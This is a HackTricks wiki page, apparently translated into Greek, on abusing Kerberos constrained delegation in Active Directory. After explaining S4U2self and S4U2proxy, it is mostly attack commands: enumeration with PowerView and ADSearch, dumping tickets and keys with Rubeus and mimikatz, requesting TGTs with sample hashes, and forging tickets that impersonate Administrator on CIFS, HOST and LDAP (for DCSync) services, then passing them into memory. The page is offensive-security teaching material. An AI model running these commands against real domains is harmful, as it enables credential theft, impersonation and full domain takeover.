# Constrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Constrained Delegation

Χρησιμοποιώντας αυτό, ένας διαχειριστής τομέα μπορεί να **επιτρέψει** σε έναν υπολογιστή να **παριστάνει έναν χρήστη ή υπολογιστή** απέναντι σε μια **υπηρεσία** μιας μηχανής.

* **Υπηρεσία για Χρήστη για τον εαυτό του (**_**S4U2self**_**):** Εάν ένας **λογαριασμός υπηρεσίας** έχει μια τιμή _userAccountControl_ που περιέχει [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), τότε μπορεί να αποκτήσει ένα TGS για τον εαυτό του (την υπηρεσία) εκ μέρους οποιουδήποτε άλλου χρήστη.
* **Υπηρεσία για Χρήστη για Proxy(**_**S4U2proxy**_**):** Ένας **λογαριασμός υπηρεσίας** θα μπορούσε να αποκτήσει ένα TGS εκ μέρους οποιουδήποτε χρήστη για την υπηρεσία που έχει οριστεί στο **msDS-AllowedToDelegateTo.** Για να το κάνει αυτό, χρειάζεται πρώτα ένα TGS από αυτόν τον χρήστη για τον εαυτό του, αλλά μπορεί να χρησιμοποιήσει το S4U2self για να αποκτήσει αυτό το TGS πριν ζητήσει το άλλο.

**Σημείωση**: Εάν ένας χρήστης είναι σημειωμένος ως ‘_Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί_’ στο AD, δεν θα **μπορείτε να τον παριστάνετε**.

Αυτό σημαίνει ότι αν **συμβιβάσετε το hash της υπηρεσίας** μπορείτε να **παριστάνετε χρήστες** και να αποκτήσετε **πρόσβαση** εκ μέρους τους στην **υπηρεσία που έχει ρυθμιστεί** (πιθανή **privesc**).

Επιπλέον, **δεν θα έχετε μόνο πρόσβαση στην υπηρεσία που μπορεί να παριστάνει ο χρήστης, αλλά και σε οποιαδήποτε υπηρεσία** επειδή το SPN (το όνομα της υπηρεσίας που ζητείται) δεν ελέγχεται, μόνο τα δικαιώματα. Επομένως, αν έχετε πρόσβαση στην **υπηρεσία CIFS** μπορείτε επίσης να έχετε πρόσβαση στην **υπηρεσία HOST** χρησιμοποιώντας την επιλογή `/altservice` στο Rubeus.

Επίσης, **η πρόσβαση στην υπηρεσία LDAP στον DC**, είναι αυτό που χρειάζεται για να εκμεταλλευτείτε ένα **DCSync**.

{% code title="Enumerate" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% endcode %}

{% code title="Λάβετε TGT" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
Υπάρχουν **άλλοι τρόποι για να αποκτήσετε ένα TGT ticket** ή το **RC4** ή **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug και η unconstrained delegation, NTLM relaying και η κακή χρήση της Active Directory Certificate Service.

**Απλά έχοντας αυτό το TGT ticket (ή hashed) μπορείτε να εκτελέσετε αυτή την επίθεση χωρίς να διακυβεύσετε ολόκληρο τον υπολογιστή.**
{% endhint %}

{% code title="Using Rubeus" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% endcode %}

{% code title="kekeo + Mimikatz" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
{% endcode %}

[**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
